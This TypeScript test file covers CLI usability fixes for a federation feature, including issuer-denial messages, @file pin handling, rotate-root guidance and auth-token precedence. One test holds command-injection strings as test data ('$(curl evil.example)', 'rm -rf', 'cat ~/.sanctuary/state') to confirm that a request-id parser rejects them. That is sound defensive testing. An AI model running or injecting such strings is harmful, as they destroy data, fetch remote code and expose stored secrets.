/**
 * Federation operator-experience regressions confirmed on real two-machine
 * hardware (drills 2026-07-30 and 2026-07-31, PR #995).
 *
 * Each of these was hit TWICE, and each time the drill only continued because
 * the operator already knew the workaround. None is a security hole: every one
 * fails closed. They are covered here because a customer does not get to know
 * the workaround, and because "the operator knew" is not a property a test can
 * assert.
 *
 *   F-FED-OPAQUEDENY   an issuer refusal maps >=5 causes onto one message
 *   F-FED-ROTLINEAGE   a running endpoint never picks up a rotate-root
 *   F-FED-ENABLEVOLATILE  `federation enable` dies with the process
 *   F-FED-AUTHENVTRAP  SANCTUARY_DASHBOARD_AUTH_TOKEN breaks the admin verbs
 *   F-FED-FLAGPARITY   `--pinned-master` takes @file on adopt but not join
 *
 * Host-free except where a real operator identity is unavoidable: the
 * enable/auth-token tests seed a keychain-free fortress (the license.test.ts
 * pattern) because the admin verbs open a real operator signer.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { randomBytes } from "node:crypto";
import { ed25519 } from "@noble/curves/ed25519";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Writable } from "node:stream";
import { toBase64url } from "../../src/core/encoding.js";
import {
  runFederationAdopt,
  runFederationJoin,
  runFederationRejoin,
  runFederationEnableDisable,
  runFederationRotateRoot,
} from "../../src/cli/federation.js";
import {
  DashboardRequestError,
  parseServerRequestId,
  type DashboardRequestContext,
} from "../../src/cli/dashboard-request.js";
import { FilesystemStorage } from "../../src/storage/filesystem.js";
import {
  seedFederationIssuerFortress,
  seedFederationJoinerFortress,
} from "../util/federation-drill-seed.js";
import { CAP_STANDARD_FORTRESS_NODE } from "../../src/mesh/constants.js";
import {
  generateFortressMaster,
  issueNodeIdentityCertificate,
  issuePrincipalCertificate,
  signFederationRootRotationCertificate,
} from "../../src/mesh/trust-root.js";
import { generateNodeKeypair } from "../../src/mesh/lifecycle/join-approver.js";
import { runInit as runInitRaw, type InitOptions } from "../../src/wrap/init.js";
import type { ExecResult } from "../../src/wrap/passphrase.js";
import type { FederationJoinerPlannedRootAdoptResult } from "../../src/mesh/federation-joiner-trust-root-store.js";

class Capture extends Writable {
  chunks: string[] = [];
  override _write(chunk: unknown, _enc: BufferEncoding, cb: (err?: Error | null) => void): void {
    this.chunks.push(String(chunk));
    cb();
  }
  text(): string {
    return this.chunks.join("");
  }
}

const K1_PUB = toBase64url(randomBytes(32));
const K2_PUB = toBase64url(randomBytes(32));
const PINNED_K2 = JSON.stringify(
  {
    public_key: K2_PUB,
    fortress_id: "fortress-1",
    created_at: "2026-07-31T00:00:00.000Z",
  },
  null,
  2,
);
const ROTATION_CERT = JSON.stringify({
  kind: "federation-root-rotation",
  fortress_id: "fortress-1",
  old_master_pubkey: K1_PUB,
  new_master: {
    public_key: K2_PUB,
    fortress_id: "fortress-1",
    created_at: "2026-07-31T00:00:00.000Z",
  },
  rotation_serial: 4,
  rotated_at: "2026-07-31T00:00:00.000Z",
  old_master_signature: toBase64url(randomBytes(64)),
});

let tmp: string;
beforeEach(async () => {
  tmp = await mkdtemp(join(tmpdir(), "sanctuary-fed-ux-"));
});
afterEach(async () => {
  await rm(tmp, { recursive: true, force: true }).catch(() => {});
});

// ── F-FED-OPAQUEDENY: the joiner-side half ────────────────────────────────────

describe("federation adopt: an issuer refusal is diagnosable", () => {
  function heldOnIssuerDenial(
    issuerRequestId?: string,
  ): FederationJoinerPlannedRootAdoptResult {
    return {
      adopted: false,
      state: "held_old_trust",
      reason: "reissue_denied",
      currentPinnedMaster: {
        public_key: K1_PUB,
        fortress_id: "fortress-1",
        created_at: "2026-07-30T00:00:00.000Z",
      },
      rotationSerial: 4,
      ...(issuerRequestId !== undefined ? { issuerRequestId } : {}),
    };
  }

  const ADOPT_ARGV = [
    "--renew",
    "--fortress-url",
    "http://issuer.example",
    "--rotation-cert",
    ROTATION_CERT,
    "--pinned-master",
    PINNED_K2,
  ];

  it("prints the issuer request id AND the exact command that redeems it", async () => {
    const err = new Capture();
    const code = await runFederationAdopt({
      argv: ADOPT_ARGV,
      env: { SANCTUARY_PASSPHRASE: "pw" },
      out: new Capture(),
      err,
      performPlannedAdopt: async () =>
        heldOnIssuerDenial("abcd1234-0000-4000-8000-00000000beef"),
    });

    expect(code).toBe(3);
    const text = err.text();
    expect(text).toContain("abcd1234-0000-4000-8000-00000000beef");
    // Naming the id is not enough; an id nobody can spend is not diagnosability.
    expect(text).toContain(
      "sanctuary audit search --request-id abcd1234-0000-4000-8000-00000000beef",
    );
    expect(text).toContain("operator_next_step");
    // And it says WHERE to run it: the reason lives on the issuer, not here.
    expect(text).toContain("ISSUER");
  });

  it("names every observed cause, not the stale three", async () => {
    const err = new Capture();
    await runFederationAdopt({
      argv: ADOPT_ARGV,
      env: { SANCTUARY_PASSPHRASE: "pw" },
      out: new Capture(),
      err,
      performPlannedAdopt: async () => heldOnIssuerDenial("id-1"),
    });
    const text = err.text();
    // The two the old message omitted, which are precisely the two the drills hit.
    expect(text).toContain("federation switched off");
    expect(text).toContain("no recorded rotation lineage");
    expect(text).toContain("not the issuer's recorded lineage");
  });

  it("prints no lookup line when the issuer sent no correlation id", async () => {
    // Older issuers, and every joiner-side refusal, have nothing to look up.
    // Printing a bare "issuer request id: undefined" would be worse than silence.
    const err = new Capture();
    await runFederationAdopt({
      argv: ADOPT_ARGV,
      env: { SANCTUARY_PASSPHRASE: "pw" },
      out: new Capture(),
      err,
      performPlannedAdopt: async () => heldOnIssuerDenial(),
    });
    expect(err.text()).not.toContain("issuer request id");
    expect(err.text()).not.toContain("undefined");
  });
});

// ── F-FED-FLAGPARITY ──────────────────────────────────────────────────────────

describe("--pinned-master takes @file on join and rejoin, as it always has on adopt", () => {
  /**
   * The pin is a multi-line JSON blob carried between machines, so `@file` is
   * the normal way to pass it. On `join` it used to fail with "not a valid
   * FortressMasterPublicKey", which reads like a corrupt pin rather than an
   * unsupported flag form. These tests stop at the NEXT validation gate, which
   * is only reachable once the pin parsed.
   */
  it("join reads @file and moves past the pin check", async () => {
    const pinPath = join(tmp, "pin.json");
    await writeFile(pinPath, PINNED_K2, "utf8");

    const err = new Capture();
    const code = await runFederationJoin({
      argv: [
        "--fortress-url",
        "http://issuer.example",
        "--bootstrap-token",
        "{}",
        "--persist",
        "--pinned-master",
        `@${pinPath}`,
      ],
      env: {}, // no credential: the gate AFTER the pin check
      out: new Capture(),
      err,
    });

    expect(code).toBe(1);
    expect(err.text()).toContain("unlocked operator identity");
    expect(err.text()).not.toContain("not a valid FortressMasterPublicKey");
  });

  it("rejoin reads @file and moves past the pin check", async () => {
    const pinPath = join(tmp, "pin.json");
    await writeFile(pinPath, PINNED_K2, "utf8");

    const err = new Capture();
    const code = await runFederationRejoin({
      argv: [
        "--fortress-url",
        "http://issuer.example",
        "--pinned-master",
        `@${pinPath}`,
      ],
      env: {}, // no bootstrap token: the gate AFTER the pin check
      out: new Capture(),
      err,
    });

    expect(code).toBe(1);
    expect(err.text()).toContain("--bootstrap-token");
    expect(err.text()).not.toContain("not a valid FortressMasterPublicKey");
  });

  it("says the path was unreadable rather than blaming the pin's contents", async () => {
    const err = new Capture();
    const code = await runFederationJoin({
      argv: [
        "--fortress-url",
        "http://issuer.example",
        "--bootstrap-token",
        "{}",
        "--persist",
        "--pinned-master",
        `@${join(tmp, "does-not-exist.json")}`,
      ],
      env: { SANCTUARY_PASSPHRASE: "pw" },
      out: new Capture(),
      err,
    });
    expect(code).toBe(1);
    expect(err.text()).toContain("could not read --pinned-master");
  });
});

/**
 * The propagation chain, end to end, with NOTHING stubbed between the HTTP
 * failure and the printed line.
 *
 * The display tests above inject the adopt result directly, so they would still
 * pass if `dashboardRequest` stopped reading `request_id`, if the transport
 * mapper dropped it, or if the joiner store failed to carry it through. This
 * test runs the REAL default adopt driver against a REAL seeded joiner fortress
 * and a REAL rotation cert, and injects failure only at the outermost seam --
 * the HTTP call itself -- so all four links are under test.
 */
describe("federation adopt: the issuer id survives the whole chain", () => {
  const PASSPHRASE = "adopt-propagation-passphrase";

  /** A joiner fortress pinned to K1, plus a genuine K1->K2 rotation cert. */
  async function seedRotatedJoiner(fortressPath: string): Promise<{
    rotationCert: string;
    pinnedK2: string;
  }> {
    const k1 = generateFortressMaster();
    const k2 = generateFortressMaster();
    const fortressId = k1.public.fortress_id;
    const k2Public = { ...k2.public, fortress_id: fortressId };

    const principalPrivate = randomBytes(32);
    const principalCert = issuePrincipalCertificate({
      principal_id: "principal-k1",
      principal_pubkey: ed25519.getPublicKey(principalPrivate),
      role: "root",
      fortress_id: fortressId,
      master_private_key: k1.private_key,
    });
    const node = generateNodeKeypair();
    const nodeCert = issueNodeIdentityCertificate({
      node_id: "joiner-node",
      node_pubkey: node.publicKey,
      node_mode: "local",
      fortress_id: fortressId,
      capabilities: CAP_STANDARD_FORTRESS_NODE,
      parent_chain: {
        fortress_master_pubkey: k1.public.public_key,
        principal_id: principalCert.principal_id,
        principal_pubkey: principalCert.principal_pubkey,
      },
      principal_private_key: principalPrivate,
      master_private_key: k1.private_key,
    });

    const seeded = await seedFederationJoinerFortress({
      storage: new FilesystemStorage(join(fortressPath, "state")),
      passphrase: PASSPHRASE,
      pinnedMaster: k1.public,
      issuingPrincipalCert: principalCert,
      localNodeCert: nodeCert,
      localNodePrivateKey: node.privateKey,
    });
    seeded.masterKey.fill(0);

    return {
      rotationCert: JSON.stringify(
        signFederationRootRotationCertificate({
          fortress_id: fortressId,
          old_master_pubkey: k1.public.public_key,
          new_master: k2Public,
          old_master_private_key: k1.private_key,
          rotation_serial: 1,
          rotated_at: "2026-07-31T00:00:00.000Z",
        }),
      ),
      pinnedK2: JSON.stringify(k2Public),
    };
  }

  it("carries a real 403's request id from the wire to the printed command", async () => {
    const fortressPath = join(tmp, "joiner");
    const materials = await seedRotatedJoiner(fortressPath);
    const issuerId = "3f2504e0-4f89-41d3-9a0c-0305e82c3301";

    const err = new Capture();
    const code = await runFederationAdopt({
      argv: [
        "--renew",
        "--fortress-url",
        "http://issuer.example",
        "--rotation-cert",
        materials.rotationCert,
        "--pinned-master",
        materials.pinnedK2,
        "--fortress",
        fortressPath,
      ],
      env: { SANCTUARY_PASSPHRASE: PASSPHRASE },
      out: new Capture(),
      err,
      // A REAL DashboardRequestError carrying a REAL request_id, exactly as
      // `dashboardRequest` constructs one from a `{error, request_id}` 403.
      request: (async () => {
        throw new DashboardRequestError(
          "auth/policy denied (HTTP 403)",
          "auth",
          403,
          issuerId,
        );
      }) as never,
    });

    expect(code).toBe(3);
    expect(err.text()).toContain("held the old trust anchor");
    expect(err.text()).toContain(`sanctuary audit search --request-id ${issuerId}`);
  });

  it("drops a hostile request id instead of printing it into the operator's shell", async () => {
    // The value is remote-controlled on a PRE-SESSION route. A non-UUID is not
    // escaped, it is discarded: the honest outcome is "nothing to look up".
    const fortressPath = join(tmp, "joiner-hostile");
    const materials = await seedRotatedJoiner(fortressPath);

    for (const hostile of [
      "x\nrm -rf ~/.sanctuary #",
      "$(curl evil.example)",
      "; cat ~/.sanctuary/state",
      "[2J[H",
      "a".repeat(4096),
    ]) {
      const text = await adoptAgainstIssuerWithId(fortressPath, materials, hostile);
      expect(text).not.toContain("rm -rf");
      expect(text).not.toContain("curl evil.example");
      expect(text).not.toContain("cat ~/.sanctuary");
      expect(text).not.toContain("issuer request id");
      expect(text.length).toBeLessThan(2000);
    }
  });

  /** Adopt against an issuer that returns a body with an arbitrary request_id. */
  async function adoptAgainstIssuerWithId(
    fortressPath: string,
    materials: { rotationCert: string; pinnedK2: string },
    rawId: string,
  ): Promise<string> {
    const err = new Capture();
    await runFederationAdopt({
      argv: [
        "--renew",
        "--fortress-url",
        "http://issuer.example",
        "--rotation-cert",
        materials.rotationCert,
        "--pinned-master",
        materials.pinnedK2,
        "--fortress",
        fortressPath,
      ],
      env: { SANCTUARY_PASSPHRASE: PASSPHRASE },
      out: new Capture(),
      err,
      // A 200 whose body is otherwise unusable: the driver falls to `denied` and
      // reads request_id off the SAME untrusted body.
      request: (async () => ({ request_id: rawId })) as never,
    });
    return err.text();
  }

  it("rejects a hostile request_id at the transport parser, not at the print site", async () => {
    // The guard has to live where the value enters, or every future display site
    // becomes a new injection point. Assert the parser itself.
    expect(parseServerRequestId("3f2504e0-4f89-41d3-9a0c-0305e82c3301")).toBe(
      "3f2504e0-4f89-41d3-9a0c-0305e82c3301",
    );
    expect(parseServerRequestId("3f2504e0-4f89-41d3-9a0c-0305e82c3301\nrm -rf /")).toBeUndefined();
    expect(parseServerRequestId("not-a-uuid")).toBeUndefined();
    expect(parseServerRequestId("")).toBeUndefined();
    expect(parseServerRequestId(42)).toBeUndefined();
    expect(parseServerRequestId(null)).toBeUndefined();
    expect(parseServerRequestId({ toString: () => "x" })).toBeUndefined();
  });
});

// ── F-FED-ROTLINEAGE (told at the moment the operator creates the condition) ──

describe("federation rotate-root: warns that a running endpoint is now stale", () => {
  const PASSPHRASE = "rotate-root-operator-ux-passphrase";

  it("prints ordered next steps naming the restart AND the re-enable", async () => {
    // A real mint + a real rotation against a real temp fortress: this asserts
    // what the verb actually emits on the success path, not a string constant.
    const fortressPath = join(tmp, "issuer");
    const storage = new FilesystemStorage(join(fortressPath, "state"));
    const seeded = await seedFederationIssuerFortress({
      storage,
      passphrase: PASSPHRASE,
      nodeId: "home-node",
    });
    seeded.masterKey.fill(0);
    seeded.masterSecret.fill(0);

    const out = new Capture();
    const err = new Capture();
    const code = await runFederationRotateRoot({
      argv: ["--renew", "--fortress", fortressPath],
      env: { SANCTUARY_PASSPHRASE: PASSPHRASE },
      out,
      err,
    });

    expect(code).toBe(0);
    const printed = JSON.parse(out.text()) as {
      rotated: boolean;
      next_steps?: string[];
    };
    expect(printed.rotated).toBe(true);

    // Machine-readable for a runbook, and on stderr for a human. Both must name
    // BOTH operator steps: the endpoint restart (F-FED-ROTLINEAGE) and the
    // status check that confirms the durable enabled switch came back up.
    const steps = (printed.next_steps ?? []).join(" ");
    expect(steps).toContain("restart it now");
    expect(steps).toContain("sanctuary federation status");
    expect(steps).toContain("sanctuary federation enable");
    expect(err.text()).toContain("next steps");
    expect(err.text()).toContain("sanctuary federation status");
  });
});

// ── F-FED-AUTHENVTRAP + F-FED-ENABLEVOLATILE ──────────────────────────────────

type ExecCall = { cmd: string; args: string[]; input?: string };
function unescapeSecurityToken(value: string): string {
  return value.replace(/\\(.)/g, "$1");
}
function readSecurityToken(input: string | undefined, flag: string): string {
  const escapedFlag = flag.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const match = input?.match(new RegExp(`${escapedFlag} "((?:[^"\\\\]|\\\\.)*)"`));
  return match ? unescapeSecurityToken(match[1]!) : "";
}
/** Keychain-free fortress seeding (mirrors license.test.ts / revoke-push). */
function makeRecoveryKeychainMock(): {
  exec: (cmd: string, args: string[], input?: string) => Promise<ExecResult>;
} {
  const calls: ExecCall[] = [];
  const stored = new Map<string, string>();
  const keyFor = (a: string, s: string): string => `${a}:${s}`;
  const exec = async (cmd: string, args: string[], input?: string): Promise<ExecResult> => {
    calls.push(input === undefined ? { cmd, args } : { cmd, args, input });
    if (cmd !== "security") return { stdout: "", stderr: "unknown", code: 1 };
    if (args[0] === "-i") {
      stored.set(
        keyFor(readSecurityToken(input, "-a"), readSecurityToken(input, "-s")),
        readSecurityToken(input, "-w"),
      );
      return { stdout: "", stderr: "", code: 0 };
    }
    if (args[0] === "find-generic-password") {
      const account = args[args.indexOf("-a") + 1] ?? "";
      const service = args[args.indexOf("-s") + 1] ?? "";
      const value = stored.get(keyFor(account, service));
      if (value) return { stdout: value + "\n", stderr: "", code: 0 };
      return { stdout: "", stderr: "not found", code: 44 };
    }
    return { stdout: "", stderr: "unknown", code: 1 };
  };
  return { exec };
}
async function runInit(options: InitOptions): Promise<Awaited<ReturnType<typeof runInitRaw>>> {
  const keychain = makeRecoveryKeychainMock();
  return runInitRaw(options, {
    recoveryKeychain: {
      home: "/tmp/sanctuary-test-home",
      platformOverride: "darwin",
      exec: keychain.exec,
    },
  });
}
function extractRecoveryKey(fileContent: string): string {
  const keyLine = fileContent
    .split("\n")
    .map((l) => l.trim())
    .find((l) => /^[A-Za-z0-9_-]{43}$/.test(l));
  if (!keyLine) throw new Error("recovery key not found");
  return keyLine;
}

describe("federation enable: the env-var trap and durable switch messaging", () => {
  let fortressPath: string;
  let recoveryKey: string;

  beforeEach(async () => {
    fortressPath = join(tmp, "f");
    const result = await runInit({
      fortress: fortressPath,
      noConfirm: true,
      noPin: true,
      noIdentity: false,
    });
    recoveryKey = extractRecoveryKey(
      await readFile(result.recoveryKeyDisclosurePath, "utf-8"),
    );
  });

  /** Records what the verb actually put on the wire. */
  function harness() {
    const contexts: (DashboardRequestContext | undefined)[] = [];
    let sessionsOpened = 0;
    return {
      contexts,
      sessionsOpened: () => sessionsOpened,
      openSession: async () => {
        sessionsOpened += 1;
        return { token: "session-token-from-ceremony", expiresAt: "", capabilities: [] };
      },
      request: async (_path: string, _init?: unknown, ctx?: DashboardRequestContext) => {
        contexts.push(ctx);
        return { enabled: true };
      },
    };
  }

  it("ignores SANCTUARY_DASHBOARD_AUTH_TOKEN, opens a session, and says so", async () => {
    // THE TRAP: the env var holds the legacy /api operator token. /v1 is
    // session-token only, so consuming it as an override suppressed the session
    // ceremony and produced "operator authorization rejected" on a correctly
    // configured machine. Every drill leg had to `unset` it first.
    const h = harness();
    const err = new Capture();
    const code = await runFederationEnableDisable({
      enable: true,
      argv: ["--fortress-url", "http://fortress.example", "--fortress", fortressPath],
      env: {
        SANCTUARY_RECOVERY_KEY: recoveryKey,
        SANCTUARY_DASHBOARD_AUTH_TOKEN: "legacy-api-token-that-v1-rejects",
      },
      out: new Capture(),
      err,
      request: h.request as never,
      openSession: h.openSession as never,
    });

    expect(code).toBe(0);
    expect(h.sessionsOpened()).toBe(1);
    // The legacy token never reaches the wire.
    expect(h.contexts[0]?.authToken).toBe("session-token-from-ceremony");
    expect(JSON.stringify(h.contexts)).not.toContain("legacy-api-token");
    // And the operator is told, so the silence is not confusing in reverse.
    expect(err.text()).toContain("SANCTUARY_DASHBOARD_AUTH_TOKEN");
    expect(err.text()).toContain("IGNORED");
  });

  it("still honors an explicit --auth-token, without the note", async () => {
    const h = harness();
    const err = new Capture();
    const code = await runFederationEnableDisable({
      enable: true,
      argv: [
        "--fortress-url",
        "http://fortress.example",
        "--fortress",
        fortressPath,
        "--auth-token",
        "explicit-operator-choice",
      ],
      env: {
        SANCTUARY_RECOVERY_KEY: recoveryKey,
        SANCTUARY_DASHBOARD_AUTH_TOKEN: "legacy-api-token-that-v1-rejects",
      },
      out: new Capture(),
      err,
      request: h.request as never,
      openSession: h.openSession as never,
    });

    expect(code).toBe(0);
    expect(h.sessionsOpened()).toBe(0);
    expect(h.contexts[0]?.authToken).toBe("explicit-operator-choice");
    expect(err.text()).not.toContain("IGNORED");
  });

  it("reports that the enabled switch is durable across restarts", async () => {
    const h = harness();
    const err = new Capture();
    await runFederationEnableDisable({
      enable: true,
      argv: ["--fortress-url", "http://fortress.example", "--fortress", fortressPath],
      env: { SANCTUARY_RECOVERY_KEY: recoveryKey },
      out: new Capture(),
      err,
      request: h.request as never,
      openSession: h.openSession as never,
    });
    expect(err.text()).toContain("durably recorded");
    expect(err.text()).toContain("endpoint restart");
  });

  it("does not print the enable-only durable-state note on disable", async () => {
    const h = harness();
    const err = new Capture();
    await runFederationEnableDisable({
      enable: false,
      argv: ["--fortress-url", "http://fortress.example", "--fortress", fortressPath],
      env: { SANCTUARY_RECOVERY_KEY: recoveryKey },
      out: new Capture(),
      err,
      request: (async () => ({ enabled: false })) as never,
      openSession: h.openSession as never,
    });
    expect(err.text()).not.toContain("durably recorded");
  });
});
